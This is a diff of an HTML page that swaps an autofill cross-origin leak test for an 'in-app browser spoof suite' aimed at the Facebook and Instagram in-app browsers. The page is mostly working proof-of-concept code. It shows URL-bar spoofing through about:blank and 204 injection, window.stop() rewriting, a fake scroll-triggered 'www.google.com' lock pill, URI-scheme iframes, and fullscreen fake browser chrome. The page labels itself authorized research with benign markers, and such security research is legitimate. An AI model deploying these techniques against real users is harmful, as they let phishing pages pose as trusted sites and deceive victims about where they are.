@@ -1,55 +1,123 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Checkout</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>google.com</title>
 <style>
- body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.4;color:#111}
- h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
- input{width:100%;padding:11px;font-size:16px;border:1px solid #ccc;border-radius:8px;margin:5px 0}
- iframe{width:100%;height:300px;border:2px solid #c0392b;border-radius:8px}
- pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:10px;white-space:pre-wrap;word-break:break-all}
+ :root{--line:#dcdce2;--card:#f4f4f7}
+ *{box-sizing:border-box}
+ body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;line-height:1.45;color:#111}
+ .wrap{max-width:520px;margin:auto;padding:14px}
+ h1{font-size:17px}h2{font-size:13px;margin:16px 0 4px}
+ p{font-size:13px;color:#666}
+ code{background:var(--card);padding:1px 5px;border-radius:4px;font-size:12px;word-break:break-all}
+ .diag{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;margin:8px 0;font-size:12px}
+ button{font-size:14px;padding:11px;margin:4px 0;width:100%;border:1px solid var(--line);border-radius:9px;background:#fff;text-align:left}
+ button:active{background:var(--card)}
+ input{width:100%;padding:10px;font-size:16px;border:1px solid var(--line);border-radius:9px;margin:5px 0}
+ .log{font-size:11px;color:#777;white-space:pre-wrap;margin-top:4px}
  .warn{color:#b23;font-size:11px}
- p{font-size:12px;color:#666}
+ /* scroll-redress fake bar */
+ #fakebar{position:fixed;left:50%;transform:translateX(-50%);min-width:180px;height:40px;padding:0 16px;
+   background:#ececef;display:none;align-items:center;justify-content:center;gap:6px;border:1px solid var(--line);
+   border-radius:20px;box-shadow:0 1px 6px rgba(0,0,0,.14);z-index:9999;font-size:15px;color:#000}
+ #fakebar.top{top:6px}#fakebar.bottom{bottom:8px}
+ .spacer{height:150vh}
+ /* fullscreen fake chrome */
+ #fc{display:none;position:fixed;inset:0;z-index:999999;background:#fff;flex-direction:column}
+ #fcbar{height:50px;background:#f2f2f7;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:center;gap:8px;font-size:16px}
+ #fcbody{flex:1;display:flex;align-items:center;justify-content:center;text-align:center;padding:20px}
 </style>
 </head>
 <body>
-<h1>Benign cross-origin autofill-broadcast test</h1>
-<p>Authorized research, own IG test account + FAKE saved card (<b>4111 1111 1111 1111</b>). This TOP
-page is one origin; the red iframe below is a DIFFERENT origin. Trigger IG payment autofill on the
-fields; watch whether the cross-origin iframe receives the autofill VALUES (= cross-origin leak).</p>
+<div id="fakebar" class="bottom"><span style="font-size:12px;opacity:.7">🔒</span><span>www.google.com</span></div>
 
-<h2>payment form — tap a field, accept IG autofill</h2>
-<form onsubmit="return false" autocomplete="on">
- <input name="ccname" autocomplete="cc-name" placeholder="name on card">
- <input name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="card number">
- <input name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY">
- <input name="cvc" autocomplete="cc-csc" inputmode="numeric" placeholder="CVC">
-</form>
+<div class="wrap">
+ <h1>FB/IG in-app — spoof suite (benign)</h1>
+ <p>Authorized research. Neutral markers only (no credential forms). Each technique tries to make the
+    in-app URL bar show a trusted host while THIS attacker content stays. Compare bar vs real origin.
+    The navigation-race class is patched; these are OTHER classes.</p>
+ <div class="diag" id="diag"></div>
+ <input id="victim" value="https://www.google.com/">
 
-<h2>contact form</h2>
-<form onsubmit="return false" autocomplete="on">
- <input name="name" autocomplete="name" placeholder="full name">
- <input name="street-address" autocomplete="street-address" placeholder="address">
- <input name="tel" autocomplete="tel" inputmode="tel" placeholder="phone">
-</form>
+ <h2>1 · 204 / about:blank inheritance</h2>
+ <button onclick="t204()">open 204 endpoint &amp; inject benign marker</button>
+ <div class="log" id="l1"></div>
 
-<h2>CROSS-ORIGIN iframe (umar1105.github.io) — watch what it receives</h2>
-<!-- change src to your SECOND origin hosting iab_xorigin_listener.html -->
-<iframe id="xf" src="https://umar1105.github.io/iab_xorigin_listener.html"></iframe>
+ <h2>2 · hanging-port + window.stop()</h2>
+ <button onclick="tStop()">open victim:8443 (hang) + stop + rewrite</button>
+ <div class="log" id="l2"></div>
 
-<h2>top-page log</h2><pre id="log"></pre>
-<p class="warn">Own account + FAKE card only. Prove capability (fake card appears cross-origin), not real data.</p>
+ <h2>3 · scroll-collapse UI redress (fake bar)</h2>
+ <p>scroll down → fake "🔒 www.google.com" pill appears over the chrome.</p>
+ <button onclick="togglePos()">toggle fake bar top/bottom</button>
+
+ <h2>4 · iframe URI-scheme (bar confusion)</h2>
+ <button onclick="ifr('geo:0,0')">iframe geo:</button>
+ <button onclick="ifr('tel:')">iframe tel: <span class="warn">(may prompt — cancel)</span></button>
+ <button onclick="ifr('maps://?q=0,0')">iframe maps://</button>
+ <div class="log" id="l4"></div>
+
+ <h2>5 · slow real resource (optimistic URL)</h2>
+ <button onclick="tSlow()">open victim slow/large resource, keep bar</button>
+ <div class="log" id="l5"></div>
+
+ <h2>6 · fullscreen fake chrome</h2>
+ <button onclick="fsEnter()">enter fullscreen + draw fake bar</button>
+ <div class="log" id="l6"></div>
+
+ <p class="diag"><b>Verdict:</b> SPOOF if the bar shows google.com (or the victim host) while this
+    page's benign content stays visible and the real origin below is not that host.</p>
+ <p class="warn">Test on your own device. Long-domain truncation needs hosting at a long subdomain (use brave_longdomain_spoof.html separately).</p>
+</div>
+<div class="spacer"></div>
+
+<div id="fc"><div id="fcbar"><span style="font-size:12px;opacity:.7">🔒</span><span>www.google.com</span></div>
+ <div id="fcbody"><div><h2 style="color:#c00">BENIGN SPOOF TEST</h2><p>Real bar hidden? Fake bar convincing?</p></div></div></div>
 
 <script>
- var L=document.getElementById('log');
- function log(m){ L.textContent = m + '\n' + L.textContent; }
- log('top origin = '+location.origin+'  IG='+/Instagram/i.test(navigator.userAgent));
- window.addEventListener('message', function(e){
-   try{ if(e.data && e.data.__listener==='ready'){ log('cross-origin listener ready @ '+e.data.origin); return; } }catch(_){}
- });
- log('When you accept IG payment autofill, check the RED iframe above: if it shows the card/contact VALUES, that is a cross-origin autofill leak.');
+ function g(id){return document.getElementById(id);}
+ g('diag').innerHTML='real origin = <code>'+location.origin+'</code><br>UA FB='+/FBAN|FBAV/i.test(navigator.userAgent)+' IG='+/Instagram/i.test(navigator.userAgent);
+ function victim(){return (g('victim').value||'https://www.google.com/').trim();}
+ function host(){return victim().replace(/^https?:\/\//,'').replace(/\/.*$/,'');}
+ function benign(tag){return '<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">'+
+   '<body style="font-family:Arial;text-align:center;padding:30px"><h1 style="color:#c00">BENIGN SPOOF TEST</h1>'+
+   '<p>technique: '+tag+'</p><p>attacker-origin content; bar should NOT say a trusted host.</p>'+
+   '<pre id=o style="font-size:11px;background:#f3f3f3;padding:8px;border-radius:6px;text-align:left"></pre>'+
+   '<scr'+'ipt>document.getElementById("o").textContent="href="+location.href+"\\norigin="+(location.origin||"(opaque)")+"\\ndomain="+document.domain;<\/scr'+'ipt>';}
+
+ function t204(){ var t=window.open('https://www.google.com/csi','_blank'); if(!t){g('l1').textContent='popup blocked';return;}
+   setTimeout(function(){ try{ t.document.open(); t.document.write(benign('204')); t.document.close(); g('l1').textContent='injected — check new tab bar vs origin'; }
+     catch(e){ try{ t.eval('document.write('+JSON.stringify(benign('204'))+');document.close()'); g('l1').textContent='injected via eval'; }catch(e2){ g('l1').textContent='blocked: '+e2.message; }
+ } },700); }
+
+ function tStop(){ var t=window.open('about:blank','_blank'); if(!t){g('l2').textContent='popup blocked';return;}
+   try{t.document.write(benign('stop'));t.document.close();}catch(e){}
+   setTimeout(function(){ try{ t.location.href='https://'+host()+':8443/'; }catch(e){}
+     setTimeout(function(){ try{t.stop&&t.stop();}catch(e){} try{t.document.write(benign('stop-rewrite'));t.document.close();}catch(e){} g('l2').textContent='stopped+rewrote — check bar'; },40); }
+,300); }
+
+ function ifr(scheme){ var f=document.createElement('iframe'); f.style.cssText='width:1px;height:1px;border:0';
+   f.srcdoc="<script>setTimeout(function(){try{location.href='"+scheme.replace(/'/g,"\\'")+"'}catch(e){}},300)<\/scr"+"ipt>";
+   document.body.appendChild(f); g('l4').textContent='fired iframe '+scheme+' — watch bar (real origin '+location.origin+')'; }
+
+ function tSlow(){ var t=window.open('about:blank','_blank'); if(!t){g('l5').textContent='popup blocked';return;}
+   try{t.document.write(benign('slow'));t.document.close();}catch(e){}
+   setTimeout(function(){ try{ t.location.href='https://'+host()+'/csi?'+Date.now(); }catch(e){} g('l5').textContent='navigated to victim resource — if bar shows '+host()+' while content stays = s
+poof'; },300); }
+
+ // scroll-redress
+ var fb=g('fakebar'); window.addEventListener('scroll',function(){ fb.style.display=(window.scrollY>40)?'flex':'none'; },{passive:true});
+ function togglePos(){ if(fb.classList.contains('bottom')){fb.classList.remove('bottom');fb.classList.add('top');}else{fb.classList.remove('top');fb.classList.add('bottom');} }
+
+ // fullscreen
+ function fsEnter(){ var el=document.documentElement; var rfs=el.requestFullscreen||el.webkitRequestFullscreen;
+   if(rfs){ try{ var p=rfs.call(el); if(p&&p.then){p.then(fsShow).catch(function(e){g('l6').textContent='fs rejected: '+e;fsShow();});} else setTimeout(fsShow,100);}catch(e){g('l6').textContent='f
+s err '+e;fsShow();} }
+   else { g('l6').textContent='no fullscreen API'; fsShow(); } }
+ function fsShow(){ g('fc').style.display='flex'; g('l6').textContent='fullscreen active='+!!(document.fullscreenElement||document.webkitFullscreenElement)+' — real bar hidden? fake bar convincing
+?'; }
 </script>
 </body>
 </html>
